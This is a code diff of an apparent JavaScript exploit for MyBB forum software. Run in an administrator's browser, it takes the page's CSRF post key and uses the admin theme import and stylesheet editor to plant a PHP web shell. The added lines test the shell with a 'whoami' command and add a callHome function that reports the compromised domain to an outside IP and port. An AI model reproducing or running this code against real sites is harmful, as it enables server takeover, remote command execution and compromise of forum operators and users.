@@ -1,5 +1,4 @@
 function postReq(toUrl,body,setHeaders = true){
-
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST",toUrl,false);
 
@@ -15,6 +14,15 @@ function postReq(toUrl,body,setHeaders = true){
 	xhr.send(body);
 }
 
+function getReq(toUrl, property = true){
+	var xhr = new XMLHttpRequest();
+
+	xhr.open("GET",toUrl,false);
+	xhr.send();
+
+	prop = property ? xhr.responseText : xhr.status;
+	return prop; 
+}
 
 function upload(url,key,payload){
 	url = url + "admin/index.php?module=style-themes&action=import";
@@ -36,13 +44,7 @@ function fakeDiv(body){
 
 function getThemeID(url){
 	url = url + "admin/index.php?module=style-themes";
-
-	var xhr = new XMLHttpRequest();
-
-	xhr.open("GET",url,false);
-	xhr.send();
-
-	responseBody = xhr.responseText;
+	responseBody = getReq(url); 
 	return fakeDiv(responseBody);
 }
 
@@ -54,6 +56,27 @@ function editStylesheet(url,key,tid,filename){
 
 }
 
+function checkShell(url,theme,filename){
+	url = url + "cache/themes/theme" + theme + "/" + filename;
+	if(getReq(url,false) == 200){
+		console.log("[*] Shell found in theme " + theme);
+		window.open(host + "cache/themes/theme"+theme+"/"+filename+"?1=whoami");
+	}else{
+		console.log("[!] Exploit failed: Couldn't find shell.")
+	}
+}
+
+function callHome(theme){
+	let IP = "10.11.6.96";
+	let port = 1234;
+
+	let url = "http://" + IP + ":" + port + "/" + document.domain + "/isPwned/theme" + theme;
+
+	getReq(url);
+}
+
+isAdmin = false;
+
 host = location.href.split('/')[0] + "//" + location.href.split('/')[2] + "/mybb/";
 key = document.getElementsByName("my_post_key")[0].value;
 filename = "910910910910910910910910xD.php";
@@ -62,4 +85,5 @@ upload(host,key,payload);
 theme = getThemeID(host);
 editStylesheet(host,key,theme,filename);
 
-window.open(host + "cache/themes/theme"+theme+"/"+filename);
+isAdmin ? checkShell(host,theme,filename) : callHome(theme);
+
